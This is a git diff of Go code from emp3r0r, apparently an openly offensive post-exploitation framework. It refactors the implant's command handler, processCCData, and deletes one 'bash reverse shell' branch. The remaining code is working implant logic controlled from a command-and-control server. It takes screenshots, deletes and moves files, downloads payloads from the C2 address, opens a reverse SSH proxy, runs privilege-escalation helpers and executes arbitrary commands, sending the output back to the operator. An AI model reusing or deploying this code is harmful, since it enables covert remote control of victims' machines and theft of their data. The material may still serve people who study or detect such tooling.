@@ -12,22 +12,23 @@ import (
 	"strconv"
 	"strings"
 
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/otiai10/copy"
 )
 
 // exec cmd, receive data, etc
-func processCCData(data *MsgTunData) {
+func processCCData(data *emp3r0r_data.MsgTunData) {
 	var (
-		data2send   MsgTunData
+		data2send   emp3r0r_data.MsgTunData
 		out         string
 		outCombined []byte
 		err         error
 	)
-	data2send.Tag = Tag
+	data2send.Tag = emp3r0r_data.Tag
 
-	payloadSplit := strings.Split(data.Payload, OpSep)
+	payloadSplit := strings.Split(data.Payload, emp3r0r_data.OpSep)
 	op := payloadSplit[0]
 
 	switch op {
@@ -39,7 +40,7 @@ func processCCData(data *MsgTunData) {
 		// # shell helpers
 		if strings.HasPrefix(cmdSlice[0], "#") {
 			out = shellHelper(cmdSlice)
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -54,18 +55,18 @@ func processCCData(data *MsgTunData) {
 			out, err = util.Screenshot()
 			if err != nil || out == "" {
 				out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
-				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 				goto send
 			}
 
 			// move to agent root
-			err = os.Rename(out, AgentRoot+"/"+out)
+			err = os.Rename(out, emp3r0r_data.AgentRoot+"/"+out)
 			if err == nil {
-				out = AgentRoot + "/" + out
+				out = emp3r0r_data.AgentRoot + "/" + out
 			}
 
 			// tell CC where to download the file
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -84,9 +85,9 @@ func processCCData(data *MsgTunData) {
 				goto send
 			}
 			out, err = util.LsPath(cwd)
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			if err != nil {
-				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, err.Error())
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, err.Error())
 			}
 			goto send
 		}
@@ -102,7 +103,7 @@ func processCCData(data *MsgTunData) {
 			if err = os.RemoveAll(path); err != nil {
 				out = fmt.Sprintf("Failed to delete %s: %v", path, err)
 			}
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -117,7 +118,7 @@ func processCCData(data *MsgTunData) {
 			if err = os.MkdirAll(path, 0700); err != nil {
 				out = fmt.Sprintf("Failed to mkdir %s: %v", path, err)
 			}
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -131,7 +132,7 @@ func processCCData(data *MsgTunData) {
 			if err = copy.Copy(cmdSlice[1], cmdSlice[2]); err != nil {
 				out = fmt.Sprintf("Failed to copy %s to %s: %v", cmdSlice[1], cmdSlice[2], err)
 			}
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -145,7 +146,7 @@ func processCCData(data *MsgTunData) {
 			if err = os.Rename(cmdSlice[1], cmdSlice[2]); err != nil {
 				out = fmt.Sprintf("Failed to move %s to %s: %v", cmdSlice[1], cmdSlice[2], err)
 			}
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -160,23 +161,8 @@ func processCCData(data *MsgTunData) {
 			if os.Chdir(path) == nil {
 				out = "changed directory to " + strconv.Quote(path)
 			}
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
-		}
-
-		// bash reverse shell
-		if cmdSlice[0] == "bash" {
-			if len(cmdSlice) != 2 {
-				return
-			}
-			token := cmdSlice[1]
-			err = ActivateShell(token)
-			if err != nil {
-				out = err.Error()
-				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
-				goto send
-			}
-			return
 		}
 
 		// current working directory
@@ -192,7 +178,7 @@ func processCCData(data *MsgTunData) {
 			}
 
 			out = "current working directory: " + pwd
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -202,18 +188,18 @@ func processCCData(data *MsgTunData) {
 				return
 			}
 
-			url := fmt.Sprintf("%swww/%s", CCAddress, cmdSlice[1])
+			url := fmt.Sprintf("%swww/%s", emp3r0r_data.CCAddress, cmdSlice[1])
 			path := cmdSlice[2]
 			size, err := strconv.ParseInt(cmdSlice[3], 10, 64)
 			if err != nil {
 				out = fmt.Sprintf("processCCData: cant get size of %s: %v", url, err)
-				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 				goto send
 			}
 			_, err = DownloadViaCC(url, path)
 			if err != nil {
 				out = fmt.Sprintf("processCCData: cant download %s: %v", url, err)
-				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 				goto send
 			}
 
@@ -225,7 +211,7 @@ func processCCData(data *MsgTunData) {
 				out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, size, checksum)
 			}
 
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -239,7 +225,7 @@ func processCCData(data *MsgTunData) {
 			fi, err := os.Stat(path)
 			if err != nil || fi == nil {
 				out = fmt.Sprintf("cant stat file %s: %v", path, err)
-				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 				goto send
 			}
 			fstat := &util.FileStat{}
@@ -253,7 +239,7 @@ func processCCData(data *MsgTunData) {
 				out = fmt.Sprintf("cant marshal file info %s: %v", path, err)
 			}
 
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -261,7 +247,7 @@ func processCCData(data *MsgTunData) {
 		   !command: special commands (not sent by user)
 		*/
 		// reverse proxy
-		if cmdSlice[0] == "!"+ModREVERSEPROXY {
+		if cmdSlice[0] == "!"+emp3r0r_data.ModREVERSEPROXY {
 			if len(cmdSlice) != 2 {
 				return
 			}
@@ -269,7 +255,7 @@ func processCCData(data *MsgTunData) {
 			out = "Reverse proxy for " + addr + " finished"
 
 			hasInternet := tun.HasInternetAccess()
-			isProxyOK := tun.IsProxyOK(AgentProxy)
+			isProxyOK := tun.IsProxyOK(emp3r0r_data.AgentProxy)
 			if !hasInternet && !isProxyOK {
 				out = "We dont have any internet to share"
 			}
@@ -278,12 +264,12 @@ func processCCData(data *MsgTunData) {
 					cancelfunc() // cancel existing connection
 				}
 			}
-			addr += ":" + ReverseProxyPort
+			addr += ":" + emp3r0r_data.ReverseProxyPort
 			ctx, cancel := context.WithCancel(context.Background())
 			if err = tun.SSHProxyClient(addr, &ReverseConns, ctx, cancel); err != nil {
 				out = err.Error()
 			}
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -291,7 +277,7 @@ func processCCData(data *MsgTunData) {
 		if strings.HasPrefix(cmdSlice[0], "!lpe_") {
 			helper := strings.TrimPrefix(cmdSlice[0], "!")
 			out = lpeHelper(helper)
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -396,14 +382,14 @@ func processCCData(data *MsgTunData) {
 			if err != nil {
 				out = "failed: " + err.Error()
 			}
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
 		// download utils.zip
 		if cmdSlice[0] == "!utils" {
 			out = vaccineHandler()
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -431,7 +417,7 @@ func processCCData(data *MsgTunData) {
 					}
 				}
 			}
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -446,7 +432,7 @@ func processCCData(data *MsgTunData) {
 					out = "Got root!"
 				}
 			}
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -461,7 +447,7 @@ func processCCData(data *MsgTunData) {
 			if err != nil {
 				out = err.Error()
 			}
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 			goto send
 		}
 
@@ -474,7 +460,7 @@ func processCCData(data *MsgTunData) {
 		}
 
 		out = string(outCombined)
-		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 
 	// #put file from CC
 	case "FILE":
